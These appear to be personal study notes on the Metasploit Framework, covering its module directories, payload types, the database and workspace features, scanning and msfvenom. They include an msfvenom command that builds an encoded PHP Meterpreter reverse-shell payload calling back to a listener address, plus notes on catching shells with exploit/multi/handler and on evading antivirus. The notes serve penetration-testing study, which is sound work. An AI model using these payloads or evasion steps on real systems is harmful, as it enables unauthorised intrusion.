
- For me the metasploit-framework directory lives here:
	- `/usr/share/metasploit-framework/modules/auxiliary`
- You can find where your msf directory is by:
	- `which msfconsole` 
	- Cat the `msfconsole` file and that will show you were the metasploit-framework directory lives in your system

`post/multi/recon/local_exploit_suggester`

- Auxiliary
	- Any supporting module, such as scanners, crawlers and fuzzers can be found in this directory
		- `tree -L 1 /usr/share/metasploit-framework/module`

- Encoders
	- Will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them
	-  Security utilities like anti-virus solutions have a database of known threats. 
	- They tend to detect threats by comparing any suspect files to that database and will alert if there is a match 
	- Sometimes they'll do additional checks, so encoders have limited success depending on the security utility solution that the focused-machine(s) may be running
	- Encoders are located in the encoders directory
		- `tree -L 1 /usr/share/metasploit-framework/encoders`

- Evasion
	- These modules will do as the directory name suggests - to try and evade said security utilities that a focused-machine may have
	- These modules live here:
		- `tree -L 2 /usr/share/metasploit-framework/evasion`

- Exploits
	- `tree -L 1 /usr/share/metasploit-framework/exploits`

- NOPs (No OPeration)
	- Do nothing, lol
	- Normally used as buffers to achieve consistent payload sizes 
	- `tree -L 1 /usr/share/metasploit-framework/modules/nops`

- Payloads
	- Codes that will run on the focused-machine
	- Exploits will leverage a vulnerability, however, it will be the payload(s) that achieve whatever the adversary is wanting to do
	- Adapters
		- Wraps single payloads to convert them into various formats
		- ie wrapping a payload in a PowerShell adapter which will run a single PowerShell command which will also execute the payload
	- Singles
		- Self-contained payloads that don't have the need to download any additional components to run on 
		- ie launching ntoepad.exe, calc.exe, adding a user to the system
	- Stagers
		- Setting up a connection between Metasploit and the focused-machine
		- Useful for working with staged payloads
		- The staged payload is first uploaded on to the target system and then the rest of the payload is downloaded 
		- The initial size of the payload will be small when compared to the full payload being sent at once
	- Stages
		- Downloaded by the stager, allows the use of larger payloads
	- Identifying payload types:
		- `/shell_payload`
			- In-line, unstaged payload
		- `/shell/payload`
			- Staged payload 
		- Notice the differences above, the in-line variant has an underscore between shell and the payload name
		- The staged payload sits in its own directory called shell
	- `tree -L 1 /usr/share/metasploit-framework/modules/payloads`
	
- Post
	- Used in the final stage of the test
	- `tree -L 1 /usr/share/metasploit-framework/modules/post`

- Scanning
- Database Feature
- Vuln Scan
- Exploit Vulns
- `msfvenom`

- Scanning
	- use auxiliary/scanner/ (and whatever you find in here)
	- search
	- always use info to find out more about how the module works
	- options as well 
		- smb/smb_version || smb_enumusers || smb_enumshares
		- 
	- You can also run nmap when not within a module in msf
	- You can also do a udp scan
		- `use auxiliary/scanner/discovery/udp_sweep`
			- pretty neat

- Database Feature
	- Useful for when considering multiple devices so as to keep project management simplified and avoid possible confusion when setting parameters
	- Requires the use of `postgresql`
		- `systemctl start postgresql`
			- Make sure that the service has started and is running
		- `msfdb init`
			- Initialise the Metasploit Database
		- `db_status`
			- Check the status of the DB when inside the MSF Console
	- Workspaces
		- Workspaces can be created to isolate different projects
		- `help workspace`
			- works
			- Will list you the various options that you can use when wanting to work with workspace(s)
	- `db_nmap`
		- Report and findings will be saved to the database/workspace that is currently being worked in 
	- `hosts`
		- will list hosts that have been picked up and stored in the database
		- `-h` for more options
		- Once host information has been stored in the DB, you can use hosts -R to add variables to the RHOST parameter
	- `services`
		- Will list the services respective to each host running them that have been picked up 
		- `-h` for more options
		- `-S` will allow you to search the DB for services in the environment (that have been scanned and added to the DB)

- Vulnerability Scanners

- Exploits
	- Run `show payloads` when within an exploit module to show compatible payloads that can go with it
	- Take note that payloads may have additional requirements/parameters that may need to be set so also don't forget to run the `options` (or `show options`) command to see what may be needed
	- Backgrounding jobs
		- Works in MSF as well
		- `ctrl+z` to background a job
	- Sessions
		- `sessions` 
			- Will list all active sessions

- MSFVENOM
- `msfvenom`
	- `msvenom --list formats`
		- Will list supported output formats
			- ie Python
	- Encoders
		- Using modern obfuscation techniques or learning methods to inject shellcode is a better solution for a Red Team Operatives problem
		- But some encoding can help
		- Example:
			- `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.123.123.123 -f raw -e php/`
			- `-p` is the parameter for payload
			- `-f` is for format, the output format, in this case it will be raw
			- `-e` is the encoder
	- Using `exploit/multi/handler`
		- To receive returned (reversed) shells

- Meterpreter
	- Staged Payloads
		- Sent in two steps
			- Initial part is called the Stager and requests the rest of the payload
			- Allows for a smaller initial payload size
	- Inline Payloads (unstaged)
		- Sent in a single step

- Viewing Meterpreter Payloads
		`msfvenom --list payloads | grep meterpreter`

- Consider
	- The OS of the system you are focusing on
		- ie  Android, Windows, OSX, Linux
	- Components that are running on it
	- Network Connection types that are available

- When in Console, don't forget about the `show payloads` command when within a module
	- Can be helpful

- SMB
- 